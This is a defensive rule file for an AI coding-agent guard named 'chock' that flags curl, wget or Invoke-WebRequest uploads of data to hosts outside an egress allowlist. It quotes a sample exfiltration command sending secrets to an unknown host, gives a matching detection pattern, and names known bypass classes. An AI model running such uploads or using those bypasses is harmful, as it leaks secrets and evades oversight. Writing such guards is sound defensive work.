---
name: block-unapproved-egress
description: "Best-effort guard against exfiltration through the tool channel: a network command (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file -- to a host outside the egress allowlist. The allowlist defaults to package registries and code hosting and is meant to be extended with your org's own domains; a host matches by exact name or \".<entry>\" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing a determined adversary needs real sandboxing. Known bypass classes include combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime. Escape: 'pragma: allowlist egress' on the line."
metadata:
  chock.artifact: rule
  chock.enforcement: advise
  chock.coverage_without_chock: advisory
---

# Block Unapproved Egress

Best-effort guard against exfiltration through the tool channel: a network command (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file -- to a host outside the egress allowlist. The allowlist defaults to package registries and code hosting and is meant to be extended with your org's own domains; a host matches by exact name or ".<entry>" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing a determined adversary needs real sandboxing. Known bypass classes include combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime. Escape: 'pragma: allowlist egress' on the line.

```
block(egress): fetch(curl|wget|iwr) + upload(-d|--data|-F|--upload-file|-X POST|PUT) to host NOT in allowlist
allow: fetch_only(GET), allowlisted_host(github|pypi|npm|...); floor_not_sandbox; escape: 'pragma: allowlist egress'
```

This skill is advisory: the client reading it has no mechanism to enforce it, and this policy stays advisory even when compiled by `chock` -- it ships rule text, not a blocking hook. See https://github.com/open-coder-ai/chock
